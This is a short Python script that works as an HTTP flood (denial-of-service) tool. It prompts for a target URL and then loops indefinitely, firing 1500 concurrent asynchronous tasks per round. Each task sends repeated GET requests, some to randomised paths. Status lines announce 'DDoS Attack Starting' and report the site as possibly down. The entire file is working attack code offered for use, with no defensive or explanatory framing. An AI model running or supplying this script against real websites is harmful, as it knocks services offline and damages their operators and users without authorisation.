import aiohttp
import asyncio
import os
import random

os.system('cls' if os.name == 'nt' else 'clear')
url = input("URL : ")
try:
    print("Server DDoS Is OK")
    while True:
        async def mains1(sessions1):
            path = random.randint(100000, 999999)
            async with sessions1.get(url + "/anonymous+" + str(path)) as packet_1:
                print("[+] DDoS Attack Starting, Path Random : /anonymous+" + str(path))
                async with sessions1.get(url) as packet_2:
                    async with sessions1.get(url) as packet_3:
                        async with sessions1.get(url) as packet_4:
                            async with sessions1.get(url) as packet_5:
                                async with sessions1.get(url) as packet_6:
                                    async with sessions1.get(url) as packet_7:
                                        async with sessions1.get(url) as packet_8:
                                            async with sessions1.get(url) as packet_9:
                                                async with sessions1.get(url) as packet_10:
                                                    print("[+] DDoS Attack Starting, Path Random : /anonymous+" + str(path))
            return packet_1
        async def main():
            thread = 1500
            ts = []
            async with aiohttp.ClientSession() as sessions1:
                for packet in range(thread):
                    t = asyncio.ensure_future(mains1(sessions1))
                    ts.append(t)
                await asyncio.gather(*ts)

        async def mains(sessions):
            path = random.randint(100000, 999999)
            async with sessions.get(url + "/anonymous+" + str(path)) as packet_1:
                print("[+] DDoS Attack Starting, Path Random : /anonymous+" + str(path))
                async with sessions.get(url) as packet_2:
                    async with sessions.get(url) as packet_3:
                        async with sessions.get(url) as packet_4:
                            async with sessions.get(url) as packet_5:
                                async with sessions.get(url) as packet_6:
                                    async with sessions.get(url) as packet_7:
                                        async with sessions.get(url) as packet_8:
                                            async with sessions.get(url) as packet_9:
                                                async with sessions.get(url) as packet_10:
                                                    print("[+] DDoS Attack Starting, Path Random : /anonymous+" + str(path))
            return packet_1
        async def main2():
            thread = 1500
            ts = []
            async with aiohttp.ClientSession() as sessions:
                for packet in range(thread):
                    t = asyncio.ensure_future(mains(sessions))
                    ts.append(t)
                await asyncio.gather(*ts)
        if __name__ == "__main__":
            loop = asyncio.get_event_loop()
            loop.run_until_complete(main())
            loop = asyncio.get_event_loop()
            loop.run_until_complete(main2())

except Exception as e:
    print("[+] Website May Be DOWN :", e)
    exit()
